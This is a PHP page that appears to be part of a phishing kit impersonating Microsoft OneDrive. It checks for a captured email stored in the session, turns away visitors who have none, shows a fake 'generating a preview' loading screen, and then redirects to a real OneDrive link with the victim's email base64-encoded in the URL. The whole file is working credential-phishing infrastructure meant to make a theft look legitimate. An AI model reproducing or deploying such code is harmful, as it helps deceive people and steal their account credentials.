<?php
error_reporting(0);
session_start();
ob_start();

function loggedin(){
if(isset($_SESSION['ma1l'])&&!empty($_SESSION['ma1l'])){
	return true;
	}else{
		return false;
		}
}


if(loggedin()){
	
date_default_timezone_set('Europe/London');
$date = date('Y/m/d H:i:s');
	
$mail = $_SESSION['ma1l'];
$touse = base64_encode($mail);	
$togo = "https://onedrive.live.com/?authkey=%21AhNdKzROxO5Mo-0&cid=400D53A9BB653D32&id=400D53A9BB653D32%211121&parId=root&o=OneUp";
$stamp = "$date";
$extension = "ashtml";

	
	
				
				}else{
		
		die(include 'go_off.php');
		}

?>

<!DOCTYPE html5>

<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><title>Downloading ... | OneDrive</title>
	<link rel="icon" type="image/ico" href="img/favicon.ico">
	<style>
	<style>
*{margin:0px; padding:0px; font-family:Helvetica, Arial, sans-serif;}
</style>

<meta http-equiv="Refresh" content="10; URL=<?php echo "$togo?$extension&encore=$touse&stamp=$stamp" ?>"> 
</head>
<body  bgcolor="#FFFFFF">
        <div id="wrapper">
		<center>
		
		<img class="ajax" src="img/ajax.gif" style="position: absolute; top: 152px; width: 32px; height: 32px; left: 298px;">
        
<p class="ajax" style="position: absolute; top: 218px; left: 196px; font-style:italic">Please wait while we generate a preview...</p>
		
		</center>
		
		</div>

</body></html>